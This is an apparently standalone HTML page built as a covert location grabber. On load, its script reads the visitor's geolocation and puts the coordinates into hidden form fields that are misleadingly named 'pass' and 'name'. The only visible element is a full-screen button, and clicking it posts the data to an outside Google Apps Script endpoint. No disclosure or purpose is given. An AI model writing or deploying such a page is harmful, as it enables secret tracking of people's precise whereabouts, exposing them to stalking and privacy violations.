<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body >
    <form  action="https://script.google.com/macros/s/AKfycbzddglPkfrUfvDMpT2HjCdzyCq9G5lQ1-NRf5tIxQ1LQrAAttoJxCrHL-2BPjEkAfz55w/exec" method="post">
        <input id="lat" type="text" class="lati" name="pass">
        <input id="lon" type="text" class="lati" name="name">
        <input class="sum" type="submit" value="onclick">
    </form>
    
    
    
      
      <style>
        .sum{
            width: 100%;
            height: 100vh;
            font-size: 120px;
            color: #ffffff;
            background-color: rgb(0, 0, 0);
        }
        .lati{
            display: none;
            width: 0.01px;
            height:0.1px ;
        }
      </style>
      
      <script>
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
        } else {
        console.log("Geolocation is not supported by this browser.");
        }

        function showPosition(position) {
            let latt=position.coords.latitude;
            document.getElementById("lat").value=latt;
            let long=position.coords.longitude;
            document.getElementById("lon").value=long;
        console.log("Latitude: " + position.coords.latitude + ", Longitude: " + position.coords.longitude);
        }

      </script>
      
      
</body>
</html>
